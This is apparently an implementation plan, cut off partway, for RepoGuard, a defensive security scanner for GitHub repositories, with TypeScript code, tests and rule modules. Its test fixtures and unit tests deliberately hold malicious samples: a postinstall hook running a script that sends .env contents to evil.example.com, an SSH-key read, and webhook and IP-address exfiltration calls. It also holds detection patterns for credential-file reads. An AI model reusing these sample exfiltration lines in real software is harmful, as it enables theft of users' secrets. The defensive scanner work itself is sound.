# RepoGuard Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a hybrid (static + AI) security scanner for GitHub repositories that outputs terminal summaries and PDF reports, targeting no-coders who download code from GitHub.

**Architecture:** Three-layer system — Input Handler (clone/validate repos), Analysis Engine (static rule engine + Claude AI review), Output Layer (terminal + PDF). The static engine runs 8 category-specific rule modules. Claude reviews flagged items and provides holistic analysis. A CLI wraps everything with `scan`, `lookup` commands.

**Tech Stack:** Node.js (TypeScript), tsup (build), Vitest (test), Commander (CLI), PDFKit (PDF), @anthropic-ai/sdk (Claude), Repomix (code packing), OSV API (dependency vulns)

**Spec:** `docs/superpowers/specs/2026-03-16-repoguard-design.md`

---

## File Structure

```
repoguard/
├── package.json
├── tsconfig.json
├── tsup.config.ts
├── vitest.config.ts
├── bin/
│   └── repoguard.ts              # CLI entry point (bin field target)
├── src/
│   ├── index.ts                   # Public API exports
│   ├── cli.ts                     # Commander CLI setup, subcommands
│   ├── scanner.ts                 # Orchestrator: ties input → analysis → output
│   ├── input/
│   │   ├── handler.ts             # Auto-detect URL vs path, clone, validate
│   │   ├── github.ts              # GitHub API metadata fetching
│   │   └── constraints.ts         # Size limits, symlink checks, binary detection
│   ├── rules/
│   │   ├── engine.ts              # Rule runner: loads & executes all rule modules
│   │   ├── types.ts               # Finding interface, RiskCategory enum, severity types
│   │   ├── data-exfiltration.ts   # Category 1: sensitive file reads, outbound calls
│   │   ├── obfuscation.ts         # Category 2: base64, eval, entropy, minified
│   │   ├── install-scripts.ts     # Category 3: postinstall, setup.py, curl|bash
│   │   ├── backdoors.ts           # Category 4: reverse shells, remote exec
│   │   ├── privacy.ts             # Category 5: tracking, fingerprinting, keylogging
│   │   ├── dependencies.ts        # Category 6: OSV lookup, typosquatting
│   │   ├── filesystem.ts          # Category 7: path traversal, system access
│   │   └── supply-chain.ts        # Category 8: repo metadata anomalies
│   ├── ai/
│   │   ├── reviewer.ts            # Claude AI review: validate findings, holistic analysis
│   │   └── prompts.ts             # System/user prompts for Claude
│   ├── scoring/
│   │   └── scorer.ts              # Category scores (0-10), verdict (GREEN/YELLOW/RED)
│   └── output/
│       ├── terminal.ts            # Traffic light box, category bars, top findings
│       └── pdf.ts                 # PDFKit report generation
└── tests/
    ├── fixtures/
    │   ├── safe-repo/             # Mock safe repo for testing
    │   ├── malicious-repo/        # Mock repo with known bad patterns
    │   └── edge-cases/            # Empty, binary-only, huge files
    ├── input/
    │   ├── handler.test.ts
    │   └── constraints.test.ts
    ├── rules/
    │   ├── engine.test.ts
    │   ├── data-exfiltration.test.ts
    │   ├── obfuscation.test.ts
    │   ├── install-scripts.test.ts
    │   ├── backdoors.test.ts
    │   ├── privacy.test.ts
    │   ├── dependencies.test.ts
    │   ├── filesystem.test.ts
    │   └── supply-chain.test.ts
    ├── ai/
    │   └── reviewer.test.ts
    ├── scoring/
    │   └── scorer.test.ts
    ├── output/
    │   ├── terminal.test.ts
    │   └── pdf.test.ts
    └── scanner.test.ts
```

---

## Chunk 1: Project Scaffolding & Core Types

### Task 1: Initialize project

**Files:**
- Create: `package.json`
- Create: `tsconfig.json`
- Create: `tsup.config.ts`
- Create: `vitest.config.ts`
- Create: `.gitignore`

- [ ] **Step 1: Initialize npm project and install dependencies**

```bash
cd c:/Antigravity/RepoGuard
npm init -y
npm install commander pdfkit @anthropic-ai/sdk repomix chalk
npm install -D typescript tsup vitest @types/node @types/pdfkit
```

- [ ] **Step 2: Configure TypeScript**

Create `tsconfig.json`:
```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "bundler",
    "lib": ["ES2022"],
    "outDir": "dist",
    "rootDir": ".",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "resolveJsonModule": true,
    "declaration": true,
    "declarationMap": true,
    "sourceMap": true
  },
  "include": ["src/**/*", "bin/**/*"],
  "exclude": ["node_modules", "dist", "tests"]
}
```

- [ ] **Step 3: Configure tsup**

Create `tsup.config.ts`:
```typescript
import { defineConfig } from 'tsup';

export default defineConfig({
  entry: ['src/index.ts', 'bin/repoguard.ts'],
  format: ['esm'],
  dts: true,
  clean: true,
  sourcemap: true,
  target: 'node20',
  shims: true,
});
```

- [ ] **Step 4: Configure Vitest**

Create `vitest.config.ts`:
```typescript
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    globals: true,
    include: ['tests/**/*.test.ts'],
  },
});
```

- [ ] **Step 5: Update package.json**

Set `"type": "module"`, add `bin`, `scripts`, `files` fields:
```json
{
  "type": "module",
  "bin": {
    "repoguard": "./dist/bin/repoguard.js"
  },
  "scripts": {
    "build": "tsup",
    "dev": "tsup --watch",
    "test": "vitest run",
    "test:watch": "vitest",
    "lint": "tsc --noEmit"
  },
  "files": ["dist", "rules"]
}
```

- [ ] **Step 6: Create .gitignore**

```
node_modules/
dist/
*.pdf
.env
```

- [ ] **Step 7: Verify setup builds**

Run: `npm run build`
Expected: Clean build with no errors

- [ ] **Step 8: Commit**

```bash
git init
git add package.json tsconfig.json tsup.config.ts vitest.config.ts .gitignore package-lock.json
git commit -m "chore: scaffold RepoGuard project with TypeScript, tsup, vitest"
```

---

### Task 2: Define core types

**Files:**
- Create: `src/rules/types.ts`
- Test: `tests/rules/types.test.ts`

- [ ] **Step 1: Write the test for core types**

Create `tests/rules/types.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import {
  RiskCategory,
  type Finding,
  type ScanResult,
  type CategoryScore,
  Verdict,
  Severity,
} from '../src/rules/types.js';

describe('RiskCategory', () => {
  it('has all 8 categories', () => {
    expect(Object.keys(RiskCategory)).toHaveLength(8);
  });

  it('includes data exfiltration', () => {
    expect(RiskCategory.DATA_EXFILTRATION).toBe('data_exfiltration');
  });
});

describe('Verdict', () => {
  it('has GREEN, YELLOW, RED', () => {
    expect(Verdict.GREEN).toBe('GREEN');
    expect(Verdict.YELLOW).toBe('YELLOW');
    expect(Verdict.RED).toBe('RED');
  });
});

describe('Severity', () => {
  it('has four levels', () => {
    expect(Object.keys(Severity)).toHaveLength(4);
  });
});

describe('Finding type', () => {
  it('can create a valid finding', () => {
    const finding: Finding = {
      severity: Severity.HIGH,
      category: RiskCategory.DATA_EXFILTRATION,
      file: 'src/utils.js',
      line: 42,
      description: 'Sends .env to external server',
      evidence: 'fetch("https://evil.com", { body: readFileSync(".env") })',
      confidence: 0.95,
    };
    expect(finding.severity).toBe(Severity.HIGH);
    expect(finding.confidence).toBeGreaterThanOrEqual(0);
    expect(finding.confidence).toBeLessThanOrEqual(1);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/rules/types.test.ts`
Expected: FAIL — module not found

- [ ] **Step 3: Implement core types**

Create `src/rules/types.ts`:
```typescript
export enum RiskCategory {
  DATA_EXFILTRATION = 'data_exfiltration',
  OBFUSCATION = 'obfuscation',
  INSTALL_SCRIPTS = 'install_scripts',
  BACKDOORS = 'backdoors',
  PRIVACY = 'privacy',
  DEPENDENCIES = 'dependencies',
  FILESYSTEM = 'filesystem',
  SUPPLY_CHAIN = 'supply_chain',
}

export enum Severity {
  LOW = 'LOW',
  MEDIUM = 'MEDIUM',
  HIGH = 'HIGH',
  CRITICAL = 'CRITICAL',
}

export enum Verdict {
  GREEN = 'GREEN',
  YELLOW = 'YELLOW',
  RED = 'RED',
}

export interface Finding {
  severity: Severity;
  category: RiskCategory;
  file: string;
  line: number;
  description: string;
  evidence: string;
  confidence: number; // 0-1
}

export interface CategoryScore {
  category: RiskCategory;
  score: number; // 0-10
  level: 'NONE' | 'LOW' | 'MEDIUM' | 'HIGH';
  findings: Finding[];
}

export interface RepoMetadata {
  url?: string;
  localPath: string;
  stars?: number;
  age?: string; // ISO date of creation
  contributors?: number;
  isFork?: boolean;
  forkedFrom?: string;
  defaultBranch?: string;
}

export interface ScanResult {
  repoMetadata: RepoMetadata;
  findings: Finding[];
  categoryScores: CategoryScore[];
  verdict: Verdict;
  summary: string;
  recommendation: string;
  scanTimestamp: string;
  scanMode: 'strict' | 'relaxed';
  aiUsed: boolean;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/rules/types.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/rules/types.ts tests/rules/types.test.ts
git commit -m "feat: define core types — Finding, RiskCategory, ScanResult, Verdict"
```

---

## Chunk 2: Input Handler

### Task 3: Input detection and validation

**Files:**
- Create: `src/input/handler.ts`
- Create: `src/input/constraints.ts`
- Test: `tests/input/handler.test.ts`
- Test: `tests/input/constraints.test.ts`

- [ ] **Step 1: Create test fixtures**

Create `tests/fixtures/safe-repo/index.js`:
```javascript
console.log('Hello, world!');
```

Create `tests/fixtures/safe-repo/package.json`:
```json
{
  "name": "safe-repo",
  "version": "1.0.0",
  "main": "index.js"
}
```

Create `tests/fixtures/malicious-repo/steal.js`:
```javascript
const fs = require('fs');
const env = fs.readFileSync('.env', 'utf8');
fetch('https://evil.example.com/collect', {
  method: 'POST',
  body: JSON.stringify({ env }),
});
```

Create `tests/fixtures/malicious-repo/package.json`:
```json
{
  "name": "malicious-repo",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node steal.js"
  }
}
```

- [ ] **Step 2: Write input handler tests**

Create `tests/input/handler.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { detectInputType, validateLocalPath } from '../../src/input/handler.js';

describe('detectInputType', () => {
  it('detects GitHub HTTPS URLs', () => {
    expect(detectInputType('https://github.com/user/repo')).toBe('url');
  });

  it('detects GitHub SSH URLs', () => {
    expect(detectInputType('git@github.com:user/repo.git')).toBe('url');
  });

  it('detects local paths', () => {
    expect(detectInputType('./my-project')).toBe('local');
    expect(detectInputType('/home/user/project')).toBe('local');
    expect(detectInputType('C:\\Users\\project')).toBe('local');
  });

  it('throws on empty input', () => {
    expect(() => detectInputType('')).toThrow();
  });

  it('treats bare names as local paths', () => {
    expect(detectInputType('my-project')).toBe('local');
  });
});

describe('validateLocalPath', () => {
  it('accepts a directory with files', async () => {
    const result = await validateLocalPath('tests/fixtures/safe-repo');
    expect(result.valid).toBe(true);
  });

  it('rejects non-existent paths', async () => {
    const result = await validateLocalPath('/nonexistent/path/xyz');
    expect(result.valid).toBe(false);
    expect(result.error).toContain('does not exist');
  });
});
```

- [ ] **Step 3: Run test to verify it fails**

Run: `npx vitest run tests/input/handler.test.ts`
Expected: FAIL — module not found

- [ ] **Step 4: Implement input handler**

Create `src/input/handler.ts`:
```typescript
import { existsSync, statSync, readdirSync } from 'node:fs';
import { resolve } from 'node:path';
import { execSync } from 'node:child_process';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { rmSync } from 'node:fs';

export type InputType = 'url' | 'local';

const GITHUB_URL_PATTERNS = [
  /^https?:\/\/(www\.)?github\.com\/[\w.-]+\/[\w.-]+/,
  /^git@github\.com:[\w.-]+\/[\w.-]+/,
];

export function detectInputType(input: string): InputType {
  if (!input || !input.trim()) {
    throw new Error('Input cannot be empty. Provide a GitHub URL or local path.');
  }

  for (const pattern of GITHUB_URL_PATTERNS) {
    if (pattern.test(input.trim())) return 'url';
  }

  // Anything that's not a URL is treated as a local path.
  // Validation happens in validateLocalPath.
  return 'local';
}

export async function validateLocalPath(
  inputPath: string
): Promise<{ valid: boolean; resolvedPath: string; error?: string }> {
  const resolvedPath = resolve(inputPath);

  if (!existsSync(resolvedPath)) {
    return { valid: false, resolvedPath, error: `Path does not exist: ${resolvedPath}` };
  }

  const stat = statSync(resolvedPath);
  if (!stat.isDirectory()) {
    return { valid: false, resolvedPath, error: `Path is not a directory: ${resolvedPath}` };
  }

  const files = readdirSync(resolvedPath);
  if (files.length === 0) {
    return { valid: false, resolvedPath, error: `Directory is empty — nothing to scan.` };
  }

  return { valid: true, resolvedPath };
}

export function cloneRepo(url: string): string {
  const tempDir = mkdtempSync(join(tmpdir(), 'repoguard-'));
  try {
    execSync(`git clone --depth 1 "${url}" "${tempDir}/repo"`, {
      stdio: 'pipe',
      timeout: 120_000,
    });
    return join(tempDir, 'repo');
  } catch (error) {
    rmSync(tempDir, { recursive: true, force: true });
    const message = error instanceof Error ? error.message : String(error);
    if (message.includes('not found') || message.includes('404')) {
      throw new Error(`Repository not found. Check the URL and try again.`);
    }
    throw new Error(
      `Clone failed. If this is a private repo, ensure your git credentials are configured.\n${message}`
    );
  }
}

export function cleanupClone(clonePath: string): void {
  try {
    const parent = resolve(clonePath, '..');
    // Safety: only delete if it's in the temp directory
    if (parent.includes('repoguard-')) {
      rmSync(parent, { recursive: true, force: true });
    }
  } catch {
    // Best effort cleanup
  }
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `npx vitest run tests/input/handler.test.ts`
Expected: PASS

- [ ] **Step 6: Write constraints tests**

Create `tests/input/constraints.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { checkConstraints, isBinaryFile, isSuspiciousSymlink } from '../../src/input/constraints.js';

describe('isBinaryFile', () => {
  it('flags .exe files', () => {
    expect(isBinaryFile('helper.exe')).toBe(true);
  });

  it('flags .dll files', () => {
    expect(isBinaryFile('lib.dll')).toBe(true);
  });

  it('allows .js files', () => {
    expect(isBinaryFile('index.js')).toBe(false);
  });

  it('allows .py files', () => {
    expect(isBinaryFile('main.py')).toBe(false);
  });
});

describe('isSuspiciousSymlink', () => {
  it('flags symlinks pointing outside repo', () => {
    expect(isSuspiciousSymlink('/repo', '/etc/passwd')).toBe(true);
  });

  it('allows symlinks within repo', () => {
    expect(isSuspiciousSymlink('/repo', '/repo/src/utils.js')).toBe(false);
  });
});

describe('checkConstraints', () => {
  it('passes for small repos', async () => {
    const result = await checkConstraints('tests/fixtures/safe-repo');
    expect(result.passed).toBe(true);
  });
});
```

- [ ] **Step 7: Implement constraints**

Create `src/input/constraints.ts`:
```typescript
import { readdirSync, readFileSync, statSync, lstatSync, readlinkSync, existsSync } from 'node:fs';
import { join, resolve, extname, relative } from 'node:path';
import type { Finding } from '../rules/types.js';
import { RiskCategory, Severity } from '../rules/types.js';

const MAX_REPO_SIZE_BYTES = 500 * 1024 * 1024; // 500MB
const MAX_FILE_COUNT = 50_000;

const BINARY_EXTENSIONS = new Set([
  '.exe', '.dll', '.so', '.dylib', '.bin', '.dat',
  '.msi', '.app', '.deb', '.rpm', '.apk', '.ipa',
  '.com', '.scr', '.pif', '.class', '.o', '.obj',
]);

export function isBinaryFile(filename: string): boolean {
  return BINARY_EXTENSIONS.has(extname(filename).toLowerCase());
}

export function isSuspiciousSymlink(repoRoot: string, linkTarget: string): boolean {
  const resolvedRoot = resolve(repoRoot);
  const resolvedTarget = resolve(linkTarget);
  return !resolvedTarget.startsWith(resolvedRoot);
}

interface ConstraintResult {
  passed: boolean;
  error?: string;
  warnings: string[];
  findings: Finding[];
  fileCount: number;
  totalSizeBytes: number;
}

export async function checkConstraints(repoPath: string): Promise<ConstraintResult> {
  const warnings: string[] = [];
  const findings: Finding[] = [];
  let fileCount = 0;
  let totalSizeBytes = 0;

  function walk(dir: string): void {
    const entries = readdirSync(dir, { withFileTypes: true });
    for (const entry of entries) {
      if (entry.name === '.git' || entry.name === 'node_modules') continue;

      // Check for malicious filenames
      if (hasSuspiciousName(entry.name)) {
        findings.push({
          severity: Severity.HIGH,
          category: RiskCategory.FILESYSTEM,
          file: entry.name,
          line: 0,
          description: `Suspicious filename detected: "${entry.name}". May be a path traversal attempt.`,
          evidence: entry.name,
          confidence: 0.9,
        });
        continue;
      }

      const fullPath = join(dir, entry.name);
      const relativePath = relative(resolve(repoPath), fullPath);

      // Check symlinks
      const lstat = lstatSync(fullPath);
      if (lstat.isSymbolicLink()) {
        const target = readlinkSync(fullPath);
        const resolvedTarget = resolve(dir, target);
        if (isSuspiciousSymlink(repoPath, resolvedTarget)) {
          findings.push({
            severity: Severity.HIGH,
            category: RiskCategory.FILESYSTEM,
            file: relativePath,
            line: 0,
            description: `Symlink points outside the repository to: ${target}`,
            evidence: `${relativePath} -> ${target}`,
            confidence: 0.95,
          });
        }
        continue; // Don't follow symlinks
      }

      if (lstat.isDirectory()) {
        walk(fullPath);
        continue;
      }

      fileCount++;
      totalSizeBytes += lstat.size;

      // Check for unexpected binaries
      if (isBinaryFile(entry.name)) {
        findings.push({
          severity: Severity.MEDIUM,
          category: RiskCategory.SUPPLY_CHAIN,
          file: relativePath,
          line: 0,
          description: `Binary file found: ${entry.name}. Binary files cannot be inspected for malicious code.`,
          evidence: entry.name,
          confidence: 0.6,
        });
      }
    }
  }

  // Check for submodules
  const gitmodulesPath = join(resolve(repoPath), '.gitmodules');
  if (existsSync(gitmodulesPath)) {
    warnings.push('This repo has submodules that were not scanned.');
  }

  // Check for LFS
  const gitattrsPath = join(resolve(repoPath), '.gitattributes');
  if (existsSync(gitattrsPath)) {
    try {
      const attrs = readFileSync(gitattrsPath, 'utf8');
      if (attrs.includes('filter=lfs')) {
        warnings.push('This repo uses Git LFS. LFS objects were not fetched or scanned.');
      }
    } catch { /* skip */ }
  }

  // Check for path-traversal filenames
  function hasSuspiciousName(name: string): boolean {
    return name.includes('..') || name.includes('\0') || /[\x00-\x1f]/.test(name);
  }

  try {
    walk(resolve(repoPath));
  } catch (error) {
    return {
      passed: false,
      error: `Failed to scan directory: ${error instanceof Error ? error.message : String(error)}`,
      warnings,
      findings,
      fileCount,
      totalSizeBytes,
    };
  }

  if (totalSizeBytes > MAX_REPO_SIZE_BYTES) {
    return {
      passed: false,
      error: `Repo exceeds size limit (${(totalSizeBytes / 1024 / 1024).toFixed(0)}MB > 500MB). Clone locally and use: repoguard scan ./path`,
      warnings,
      findings,
      fileCount,
      totalSizeBytes,
    };
  }

  if (fileCount > MAX_FILE_COUNT) {
    return {
      passed: false,
      error: `Repo exceeds file count limit (${fileCount} > ${MAX_FILE_COUNT} files).`,
      warnings,
      findings,
      fileCount,
      totalSizeBytes,
    };
  }

  return { passed: true, warnings, findings, fileCount, totalSizeBytes };
}
```

- [ ] **Step 8: Run all tests**

Run: `npx vitest run tests/input/`
Expected: PASS

- [ ] **Step 9: Commit**

```bash
git add src/input/ tests/input/ tests/fixtures/
git commit -m "feat: add input handler — URL/path detection, clone, validation, constraints"
```

---

## Chunk 3: Static Rule Engine — Categories 1-4

### Task 4: Rule engine runner

**Files:**
- Create: `src/rules/engine.ts`
- Test: `tests/rules/engine.test.ts`

- [ ] **Step 1: Write rule engine test**

Create `tests/rules/engine.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { RuleEngine } from '../../src/rules/engine.js';
import { RiskCategory } from '../../src/rules/types.js';

describe('RuleEngine', () => {
  it('runs all registered rule modules against a repo path', async () => {
    const engine = new RuleEngine();
    const findings = await engine.scan('tests/fixtures/safe-repo');
    expect(Array.isArray(findings)).toBe(true);
  });

  // Note: this test will pass once rule modules are implemented (Tasks 5-12).
  // Skip it for now; it will be enabled in Task 13.
  it.skip('finds issues in malicious repos', async () => {
    const engine = new RuleEngine();
    const findings = await engine.scan('tests/fixtures/malicious-repo');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some(f => f.category === RiskCategory.DATA_EXFILTRATION)).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/rules/engine.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement rule engine**

Create `src/rules/engine.ts`:
```typescript
import { resolve } from 'node:path';
import type { Finding } from './types.js';
import { scanDataExfiltration } from './data-exfiltration.js';
import { scanObfuscation } from './obfuscation.js';
import { scanInstallScripts } from './install-scripts.js';
import { scanBackdoors } from './backdoors.js';
import { scanPrivacy } from './privacy.js';
import { scanDependencies } from './dependencies.js';
import { scanFilesystem } from './filesystem.js';
export type RuleModule = (repoPath: string, files: FileEntry[]) => Promise<Finding[]>;

export interface FileEntry {
  relativePath: string;
  absolutePath: string;
  content: string;
  extension: string;
}

export class RuleEngine {
  // Note: supply-chain is handled separately by the scanner orchestrator
  // (which passes GitHub metadata). It's not in this list to avoid duplicate findings.
  private modules: RuleModule[] = [
    scanDataExfiltration,
    scanObfuscation,
    scanInstallScripts,
    scanBackdoors,
    scanPrivacy,
    scanDependencies,
    scanFilesystem,
  ];

  async scan(repoPath: string): Promise<Finding[]> {
    const resolvedPath = resolve(repoPath);
    const files = await this.collectFiles(resolvedPath);
    const allFindings: Finding[] = [];

    for (const mod of this.modules) {
      try {
        const findings = await mod(resolvedPath, files);
        allFindings.push(...findings);
      } catch {
        // Individual module failure shouldn't stop the scan
      }
    }

    return allFindings;
  }

  async collectFiles(repoPath: string): Promise<FileEntry[]> {
    const { readdirSync, readFileSync, lstatSync } = await import('node:fs');
    const { join, extname, relative } = await import('node:path');
    const files: FileEntry[] = [];

    const TEXT_EXTENSIONS = new Set([
      '.js', '.ts', '.jsx', '.tsx', '.mjs', '.cjs',
      '.py', '.rb', '.go', '.rs', '.java', '.kt', '.swift',
      '.php', '.sh', '.bash', '.zsh', '.ps1', '.bat', '.cmd',
      '.json', '.yaml', '.yml', '.toml', '.xml', '.html', '.css',
      '.md', '.txt', '.cfg', '.ini', '.env', '.conf',
      '.c', '.cpp', '.h', '.hpp', '.cs', '.lua', '.r',
      '.makefile', '.dockerfile', '',
    ]);

    function walk(dir: string): void {
      const entries = readdirSync(dir, { withFileTypes: true });
      for (const entry of entries) {
        if (entry.name === '.git' || entry.name === 'node_modules') continue;
        const fullPath = join(dir, entry.name);
        const stat = lstatSync(fullPath);

        if (stat.isSymbolicLink()) continue;
        if (stat.isDirectory()) { walk(fullPath); continue; }

        const ext = extname(entry.name).toLowerCase();
        // Also include files with no extension (Makefile, Dockerfile, etc.)
        const isTextLike = TEXT_EXTENSIONS.has(ext) || ext === '';
        if (!isTextLike) continue;
        if (stat.size > 1_000_000) continue; // Skip files > 1MB

        try {
          const content = readFileSync(fullPath, 'utf8');
          files.push({
            relativePath: relative(repoPath, fullPath),
            absolutePath: fullPath,
            content,
            extension: ext,
          });
        } catch {
          // Skip unreadable files
        }
      }
    }

    walk(repoPath);
    return files;
  }
}
```

- [ ] **Step 4: Create stub rule modules (so engine compiles)**

Create stub files for all 8 rule modules. Each returns an empty array for now:

`src/rules/data-exfiltration.ts`, `src/rules/obfuscation.ts`, `src/rules/install-scripts.ts`, `src/rules/backdoors.ts`, `src/rules/privacy.ts`, `src/rules/dependencies.ts`, `src/rules/filesystem.ts`, `src/rules/supply-chain.ts`

Each with:
```typescript
import type { FileEntry } from './engine.js';
import type { Finding } from './types.js';

export async function scanXxx(_repoPath: string, _files: FileEntry[]): Promise<Finding[]> {
  return [];
}
```

- [ ] **Step 5: Run test to verify basic engine works**

Run: `npx vitest run tests/rules/engine.test.ts`
Expected: PASS (safe repo returns empty array; malicious repo test is skipped until rules are implemented)

- [ ] **Step 6: Commit**

```bash
git add src/rules/engine.ts src/rules/data-exfiltration.ts src/rules/obfuscation.ts src/rules/install-scripts.ts src/rules/backdoors.ts src/rules/privacy.ts src/rules/dependencies.ts src/rules/filesystem.ts src/rules/supply-chain.ts tests/rules/engine.test.ts
git commit -m "feat: add rule engine runner with stub modules for all 8 categories"
```

---

### Task 5: Data Exfiltration rules (Category 1)

**Files:**
- Modify: `src/rules/data-exfiltration.ts`
- Test: `tests/rules/data-exfiltration.test.ts`

- [ ] **Step 1: Write data exfiltration tests**

Create `tests/rules/data-exfiltration.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { scanDataExfiltration } from '../../src/rules/data-exfiltration.js';
import { RiskCategory, Severity } from '../../src/rules/types.js';
import type { FileEntry } from '../../src/rules/engine.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: '.js' };
}

describe('scanDataExfiltration', () => {
  it('flags reading .env and sending to external URL', async () => {
    const files = [makeFile('steal.js', `
      const env = fs.readFileSync('.env', 'utf8');
      fetch('https://evil.com/collect', { method: 'POST', body: env });
    `)];
    const findings = await scanDataExfiltration('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].category).toBe(RiskCategory.DATA_EXFILTRATION);
  });

  it('flags reading SSH keys', async () => {
    const files = [makeFile('hack.js', `
      const key = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');
    `)];
    const findings = await scanDataExfiltration('/repo', files);
    expect(findings.some(f => f.description.includes('SSH') || f.description.includes('sensitive'))).toBe(true);
  });

  it('flags Discord/Slack webhook URLs', async () => {
    const files = [makeFile('notify.js', `
      fetch('https://discord.com/api/webhooks/1234/abcd', { method: 'POST', body: data });
    `)];
    const findings = await scanDataExfiltration('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags hardcoded IP addresses with HTTP calls', async () => {
    const files = [makeFile('beacon.js', `
      axios.post('http://192.168.1.100:8080/exfil', { data: secrets });
    `)];
    const findings = await scanDataExfiltration('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not flag normal fetch calls', async () => {
    const files = [makeFile('api.js', `
      const response = await fetch('https://api.github.com/repos');
      const data = await response.json();
    `)];
    const findings = await scanDataExfiltration('/repo', files);
    expect(findings.length).toBe(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/rules/data-exfiltration.test.ts`
Expected: FAIL — stub returns empty array

- [ ] **Step 3: Implement data exfiltration scanner**

Replace `src/rules/data-exfiltration.ts`:
```typescript
import type { FileEntry } from './engine.js';
import type { Finding } from './types.js';
import { RiskCategory, Severity } from './types.js';

const SENSITIVE_FILE_PATTERNS = [
  /readFileSync\s*\(\s*['"`].*\.env['"`]/,
  /readFileSync\s*\(\s*['"`].*id_rsa['"`]/,
  /readFileSync\s*\(\s*['"`].*id_ed25519['"`]/,
  /readFileSync\s*\(\s*['"`].*\.ssh/,
  /readFileSync\s*\(\s*['"`].*credentials['"`]/,
  /readFileSync\s*\(\s*['"`].*\.aws/,
  /readFileSync\s*\(\s*['"`].*\.npmrc['"`]/,
  /readFileSync\s*\(\s*process\.env\.HOME\s*\+\s*['"`].*\.ssh/,
  /open\s*\(\s*['"`].*\.env['"`]/,
  /open\s*\(\s*['"`].*id_rsa['"`]/,
  /open\s*\(\s*['"`].*\.ssh/,
  /os\.environ\b/,
  /cookie|localStorage|sessionStorage/,
];

const WEBHOOK_PATTERNS = [
  /discord\.com\/api\/webhooks/i,
  /hooks\.slack\.com/i,
  /api\.telegram\.org\/bot/i,
];

const EXFIL_URL_PATTERNS = [
  /https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/,
  /\.(post|put|patch)\s*\(\s*['"`]https?:\/\/(?!(?:api\.github\.com|registry\.npmjs\.org|pypi\.org))/i,
  /fetch\s*\(\s*['"`]https?:\/\/(?!(?:api\.github\.com|registry\.npmjs\.org|pypi\.org)).*method:\s*['"`]POST/is,
];

export async function scanDataExfiltration(
  _repoPath: string,
  files: FileEntry[]
): Promise<Finding[]> {
  const findings: Finding[] = [];

  for (const file of files) {
    const lines = file.content.split('\n');

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      const lineNum = i + 1;

      // Check sensitive file reads
      for (const pattern of SENSITIVE_FILE_PATTERNS) {
        if (pattern.test(line)) {
          findings.push({
            severity: Severity.HIGH,
            category: RiskCategory.DATA_EXFILTRATION,
            file: file.relativePath,
            line: lineNum,
            description: `Reads sensitive file or data that could be exfiltrated.`,
            evidence: line.trim(),
            confidence: 0.8,
          });
          break;
        }
      }

      // Check webhook URLs (data sinks)
      for (const pattern of WEBHOOK_PATTERNS) {
        if (pattern.test(line)) {
          findings.push({
            severity: Severity.HIGH,
            category: RiskCategory.DATA_EXFILTRATION,
            file: file.relativePath,
            line: lineNum,
            description: `Webhook URL detected — commonly used to exfiltrate data to Discord/Slack/Telegram.`,
            evidence: line.trim(),
            confidence: 0.85,
          });
          break;
        }
      }

      // Check suspicious outbound URLs
      for (const pattern of EXFIL_URL_PATTERNS) {
        if (pattern.test(line)) {
          findings.push({
            severity: Severity.MEDIUM,
            category: RiskCategory.DATA_EXFILTRATION,
            file: file.relativePath,
            line: lineNum,
            description: `Outbound HTTP call to suspicious endpoint detected.`,
            evidence: line.trim(),
            confidence: 0.6,
          });
          break;
        }
      }
    }
  }

  return findings;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/rules/data-exfiltration.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/rules/data-exfiltration.ts tests/rules/data-exfiltration.test.ts
git commit -m "feat: implement data exfiltration detection — sensitive files, webhooks, suspicious URLs"
```

---

### Task 6: Obfuscation rules (Category 2)

**Files:**
- Modify: `src/rules/obfuscation.ts`
- Test: `tests/rules/obfuscation.test.ts`

- [ ] **Step 1: Write obfuscation tests**

Create `tests/rules/obfuscation.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { scanObfuscation, calculateEntropy } from '../../src/rules/obfuscation.js';
import { RiskCategory } from '../../src/rules/types.js';
import type { FileEntry } from '../../src/rules/engine.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: relativePath.split('.').pop() || '' };
}

describe('calculateEntropy', () => {
  it('returns low entropy for simple strings', () => {
    expect(calculateEntropy('aaaaaaaaaa')).toBeLessThan(2);
  });

  it('returns high entropy for random-looking strings', () => {
    expect(calculateEntropy('aB3$kL9!mN2@pQ5')).toBeGreaterThan(3.5);
  });
});

describe('scanObfuscation', () => {
  it('flags eval with dynamic strings', async () => {
